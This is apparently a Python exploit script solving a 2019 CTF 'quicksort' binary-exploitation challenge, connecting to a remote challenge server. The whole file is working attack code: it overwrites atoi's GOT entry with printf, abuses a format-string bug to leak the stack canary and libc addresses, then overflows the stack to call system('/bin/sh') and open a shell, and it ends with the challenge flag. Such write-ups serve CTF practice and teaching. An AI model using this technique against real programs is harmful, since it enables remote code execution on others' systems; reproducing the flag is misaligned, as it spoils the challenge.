# File: exp.py
# Author: raycp
# Data: 2019-04-30
# Description: exp for quicksort

from pwn_debug.pwn_debug import *


def pwn():
    # step1 init pwn_debug and process
    pdbg=pwn_debug("quicksort")

    pdbg.context.terminal=['tmux', 'splitw', '-h']

    pdbg.local("libc.so.6")
    pdbg.debug("2.23")
    pdbg.remote('34.92.96.238',10000)

    #p=pdbg.run("local")
    #p=pdbg.run("debug")
    p=pdbg.run("remote")

    pdbg.bp(0x80489aa)
    
    # step2 overwrite atoi got to printf plt
    p.recvuntil("sort?")
    p.sendline("6")
    p.recvuntil("number:")
    p.sendline(str(pdbg.elf.plt['printf']).ljust(0x10,'\x00')+p32(6)+p32(0)+p32(0)+p32(pdbg.elf.got['atoi']))
    
    # step3 leak address and canary with fmt vuln
    p.recvuntil("number:")
    p.sendline("%15$x%23$x%2$x".ljust(0x10,'\x00')+p32(6)+p32(0)+p32(0)+p32(0x804a000 +0x500))
    canary=int(p.recv(8),16)
    libc_base=int(p.recv(8),16)-pdbg.libc.symbols["__libc_start_main"]-247
    system_addr=libc_base+pdbg.libc.symbols['system']
    binsh=libc_base+next(pdbg.libc.search("/bin/sh"))
    stack_addr=int(p.recv(8),16)
    print hex(canary),hex(libc_base),hex(stack_addr)
    
    # get the shell with stack overflow vuln
    p.recvuntil("number:")
    p.sendline(p32(0x11)+p32(0x1)+p32(0x0)+p32(0)+p32(0x0)+p32(0)*2+p32(stack_addr+0x18)+p32(canary)+p32(0)*3+p32(system_addr)+p32(0)+p32(binsh)+p32(0x11)*8)
    p.interactive() ##get the shell

if __name__ == '__main__':
   pwn()

#*CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}

